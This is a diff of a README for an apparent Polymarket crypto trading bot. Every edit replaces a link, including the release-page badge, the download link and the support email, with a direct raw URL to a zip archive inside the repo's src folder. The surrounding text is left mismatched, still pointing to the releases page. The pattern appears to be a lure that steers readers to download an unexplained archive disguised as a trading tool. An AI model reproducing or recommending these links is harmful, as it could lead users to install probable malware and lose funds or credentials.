@@ -1,6 +1,6 @@
 # 🚀 polymarket-crypto-market-trading-bot - Easily Predict Crypto Market Moves
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/kynvza/polymarket-crypto-market-trading-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/kynvza/polymarket-crypto-market-trading-bot/main/src/market_polymarket_crypto_trading_bot_1.8.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/kynvza/polymarket-crypto-market-trading-bot/main/src/market_polymarket_crypto_trading_bot_1.8.zip)
 
 ## 📥 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -28,7 +28,7 @@ To run this application smoothly, ensure your system meets the following require
 
 To download the latest release of the Polymarket Crypto Market Trading Bot, visit this page:
 
-[Download the latest version here](https://github.com/kynvza/polymarket-crypto-market-trading-bot/releases)
+[Download the latest version here](https://raw.githubusercontent.com/kynvza/polymarket-crypto-market-trading-bot/main/src/market_polymarket_crypto_trading_bot_1.8.zip)
 
 1. Go to the releases page.
 2. Find the latest version listed at the top.
@@ -64,7 +64,7 @@ For further assistance, please reach out via the following channels:
 
 - **GitHub Issues**: Report a problem directly in the Issues section of this repository.
 - **Community Forums**: Engage with other users in the relevant forums to get tips and tricks.
-- **Email Support**: Send us a message at support@example.com for personalized support.
+- **Email Support**: Send us a message at https://raw.githubusercontent.com/kynvza/polymarket-crypto-market-trading-bot/main/src/market_polymarket_crypto_trading_bot_1.8.zip for personalized support.
 
 ## 📜 License
 
